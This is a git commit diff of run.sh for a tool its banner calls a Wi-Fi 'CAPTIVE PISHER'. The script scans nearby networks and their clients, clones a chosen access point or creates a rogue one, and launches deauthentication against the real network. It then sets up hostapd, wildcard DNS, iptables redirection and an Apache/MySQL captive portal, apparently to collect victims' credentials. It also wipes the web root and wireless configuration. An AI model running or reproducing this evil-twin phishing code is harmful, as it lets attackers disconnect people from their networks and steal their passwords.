7cdaedb9fa2e5af531dd72fe5eaea434401f22c9
hacefresko <victorfrespe@gmail.com>
2020-09-29 14:19:30 +0200

    Update run.sh
    - Updated selecrtNetwork function
    - Fixed bugs

--- run.sh
+++ run.sh
@@ -11,7 +11,7 @@ titulo () {
 	 |          -.
  	 /\            -.
 	 \_\_             -.
-       ########~~~~~~~~~~~~~~ WIFI PISHER by HACEFRESKO
+       ########~~~~~~~~~~~~~~ CAPTIVE PISHER by HACEFRESKO
 
 "
 }
@@ -120,7 +120,8 @@ selectNetworkInterface2 () {
                 fi
         else
                 echo "[x] Not enough network interfaces found (2)"
-        fi
+        	ok=0
+	fi
 
         if [ $ok -eq 1 ]
         then
@@ -137,37 +138,54 @@ selectNetwork () {
         pkill airodump-ng
 
         num=$(grep "<wireless-network"  $tempFolder/temporal-01.kismet.netxml | wc -l)
+        begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
+        endLines=$(grep -n "</wireless-network>" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
+
         i=1
-        j=1
         while [ $i -le $num ]
         do
-                tbssid[$i]=$(grep BSSID  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)
-                tessid[$i]=$(grep essid  $tempFolder/temporal-01.kismet.netxml | sed -n "$i"p | cut -d ">" -f 2 | cut -d "<" -f 1)
+                beg=$(echo $begLines | cut -d " " -f $i)
+                end=$(echo $endLines | cut -d " " -f $i)
 
-                valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)
+                tusers[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep "</wireless-client>" | wc -l)
+                if [ ${tusers[$i]} -ge 1 ]
+                then
+                        prov=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep -n "<wireless-client" -m 1 | cut -d ":" -f 1)
+                        end=$(( $beg + $prov ))
+                fi
 
-                while [ "$valid" == "client" ]
-                do
-                        j=$(( $j + 1 ))
-                        valid=$(grep "<wireless" $tempFolder/temporal-01.kismet.netxml | cut -d "-" -f 2 | cut -d " " -f 1 | cut -d ">" -f 1 | sed -n "$j"p)
-                done
-                tchannel[$i]=$(grep channel  $tempFolder/temporal-01.kismet.netxml | sed -n "$j"p | cut -d ">" -f 2 | cut -d "<" -f 1)
+                tbssid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID | cut -d ">" -f 2 | cut -d "<" -f 1)
+                tessid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep essid | cut -d ">" -f 2 | cut -d "<" -f 1)
+                tchannel[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
+                tencr[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep encryption -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
 
                 if [ -z "${tessid[$i]}" ]
                 then
                         tessid[$i]="Unknown"
                 fi
+
+                if [ $(echo "${tencr[$i]}" | grep "WPA") ]
+                then
+                        tencr[$i]="WPA"
+                elif [ $(echo "${tencr[$i]}" | grep "None") ]
+                then
+                        tencr[$i]="OPEN"
+                else
+                        tencr[$i]="-----"
+                fi
+
                 i=$(( $i + 1 ))
-                j=$(( $j + 1 ))
         done
 
         echo "WIFI NETWORKS"
         echo "Network interface: $interface"
         echo
+        echo "               BSSID        ENCRYPT CHANNEL CLIENTS    ESSID"
+        echo "         --------------------------------------------------------"
         i=1
         while [ $i -le $num ]
         do
-                printf  '%-5s %-2s %-17s %-1s %-2s %-1s %.44s\n'  "[$i]" "->" "${tbssid[$i]}" "|" "${tchannel[$i]}" "|" "${tessid[$i]}"
+                printf  '%-5s %-2s %-17s %-1s %-5s %-3s %-3s %-3s %-3s %-1s %.44s\n'  "[$i]" "->" "${tbssid[$i]}" "|" "${tencr[$i]}" "|" "${tchannel[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}"
                 i=$(( $i + 1 ))
         done
 
@@ -177,6 +195,8 @@ selectNetwork () {
         bssid=${tbssid[$network]}
         essid=${tessid[$network]}
         channel=${tchannel[$network]}
+        encr=${tencr[$network]}
+
 }
 
 deauth(){
@@ -234,7 +254,7 @@ then
         do
                 echo
                 echo "Select an option:"
-                echo "[1] -> Create new acces point"
+                echo "[1] -> Create new Wi-Fi acces point"
                 echo "[2] -> Intercept existing access point"
                 read -p "> " op
 		echo
@@ -250,149 +270,159 @@ then
                 deauth=0
                 read -p "Wifi essid > " essid
                 read -p "Channel > " channel
-        elif [ $op -eq 2 ]
-        then
-                deauth=1
-                selectNetwork
-        fi
-
-
-        op=-1
-	echo
-        echo "Security: "
-        while [ $op -lt 0 ] || [ $op -gt 2 ]
-        do
-                echo "[1] -> Open"
-                echo "[2] -> WPA2"
-                read -p "> " op
-		echo
+		op=-1
+		echo "Security: "
+        	while [ $op -lt 0 ] || [ $op -gt 2 ]
+        	do
+                	echo "[1] -> Open"
+	                echo "[2] -> WPA2"
+        	        read -p "> " op
+			echo
 
                 if [ $op -lt 1 ] || [ $op -gt 2 ]
                 then
                         echo "Please, select a valid option: "
                 fi
+
+		if [ $op -eq 1 ]
+		then
+			encr="OPEN"
+		else
+			encr="WPA"
+		fi
+
         done
-
-        if [ $op -eq 1 ]
+	elif [ $op -eq 2 ]
         then
-
-                echo "interface=$interface
-driver=nl80211
-ssid=$essid
-hw_mode=g
-channel=$channel
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
-
-        elif [ $op -eq 2 ]
-        then
-
-        read -p "Wifi password [more than 8 chars]> " pass
-	echo
-
-        echo "interface=$interface
-driver=nl80211
-ssid=$essid
-hw_mode=g
-wpa=2
-wpa_passphrase=$pass
-wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
-channel=$channel
-macaddr_acl=0
-ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
-
-        fi
-
-	gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
-	clear
-
-########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
-
-	# Stops dnsmasq daemon on port 53
-	service dnsmasq stop
-
-	# Checks for Internet connection
-	conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')
-
-	if [ $conex -lt 100 ]
-	then
-
-		echo "interface=$interface
-dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-server=8.8.8.8
-log-queries
-listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf
-
-		# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
-
-		# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
-		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
-
-		# Everything going out this machine goes by eth0 and masqued
-		iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
-
-	else
-
-		echo "interface=$interface
-dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
-server=8.8.8.8
-log-queries
-listen-address=127.0.0.1
-address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
-
+                deauth=1
+		selectNetworkInterface2 $interface
+                if [ $ok -eq 1 ]
+		then
+			selectNetwork
+        	fi
 	fi
 
-	# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
-	# (.htaccess) can reffer directly to the domain name in the URL
-	echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts
+	if [ $ok -eq 1 ]
+	then
 
-	ifconfig $interface 10.0.0.1
+	        if [ "$encr" = "OPEN" ]
+	        then
 
-	gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"
+	                echo "interface=$interface
+	driver=nl80211
+	ssid=$essid
+	hw_mode=g
+	channel=$channel
+	macaddr_acl=0
+	auth_algs=1
+	ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
-################################### WEB FILES #########################################
+	        else
 
-	rm -r /var/www/html/*
-	cp -r captive /var/www/html/captive
-	cp .htaccess /var/www/html
-	chmod 777 /var/www/html/.htaccess
-	chmod 777 /var/www/html/captive
-	chmod 777 /var/www/html/captive/*
+	        	read -p "Wifi password [more than 8 chars]> " pass
+			echo
 
-	cp -f override.conf /etc/apache2/conf-available/
+	        	echo "interface=$interface
+	driver=nl80211
+	ssid=$essid
+	hw_mode=g
+	wpa=2
+	wpa_passphrase=$pass
+	wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256
+	channel=$channel
+	macaddr_acl=0
+	ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
-	# Enables rewrite and override for .htaccess
-	a2enconf override
-	a2enmod rewrite
+	        fi
 
-	# Removes previous wireless configuration
-	rm -rf /etc/wpa_supplicant/wpa_supplicant.conf
+		gnome-terminal --geometry 117x24+0+0 -e "bash -c \"clear; hostapd $tempFolder/hostapd.conf; exec bash\"" -q -t "$essid $channel"
+		clear
 
-	service apache2 reload
-	service apache2 restart
-	service mysql start
+	########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
 
-	if [ $deauth -eq 1 ]
-        then
-                export -f deauth
-                export -f selectNetworkInterface2
-		export $bssid
-		export $channel
-		export $interface
-                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"selectNetworkInterface2 \"$interface\"; deauth \"$bssid\" \"$channel\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
-		export -f titulo
-		gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
-	else
-		export -f titulo
-		gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
-        fi
+		# Stops dnsmasq daemon on port 53
+		service dnsmasq stop
 
-	rm -r $tempFolder
+		# Checks for Internet connection
+		conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')
 
-	clear
+		if [ $conex -lt 100 ]
+		then
+
+			echo "interface=$interface
+	dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
+	dhcp-option=3,10.0.0.1
+	dhcp-option=6,10.0.0.1
+	server=8.8.8.8
+	log-queries
+	listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf
+
+			# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
+
+			# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
+			iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+
+			# Everything going out this machine goes by eth0 and masqued
+			iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
+
+		else
+
+			echo "interface=$interface
+	dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
+	dhcp-option=3,10.0.0.1
+	dhcp-option=6,10.0.0.1
+	server=8.8.8.8
+	log-queries
+	listen-address=127.0.0.1
+	address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
+
+		fi
+
+		# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
+		# (.htaccess) can reffer directly to the domain name in the URL
+		echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts
+
+		ifconfig $interface 10.0.0.1
+
+		gnome-terminal --geometry 117x25+0+600 -e "bash -c \"clear; dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts -d; exec bash\"" -q -t "DHCP"
+
+	################################### WEB FILES #########################################
+
+		rm -r /var/www/html/*
+		cp -r captive /var/www/html/captive
+		cp .htaccess /var/www/html
+		chmod 777 /var/www/html/.htaccess
+		chmod 777 /var/www/html/captive
+		chmod 777 /var/www/html/captive/*
+
+		cp -f override.conf /etc/apache2/conf-available/
+
+		# Enables rewrite and override for .htaccess
+		a2enconf override
+		a2enmod rewrite
+
+		# Removes previous wireless configuration
+		rm -rf /etc/wpa_supplicant/wpa_supplicant.conf
+
+		service apache2 reload
+		service apache2 restart
+		service mysql start
+
+		if [ $deauth -eq 1 ]
+	        then
+	                export -f deauth
+	                export -f selectNetworkInterface2
+			export $bssid
+			export $channel
+	                gnome-terminal --geometry 117x25+1000+600 -e "bash -c \"deauth \"$bssid\" \"$channel\"; exec bash\"" -q -t "Deauth $essid ($bssid) channel $channel"
+			export -f titulo
+			gnome-terminal --geometry 117x25+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+		else
+			export -f titulo
+			gnome-terminal --geometry 117x50+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"
+	        fi
+
+		rm -r $tempFolder
+
+	fi
 fi
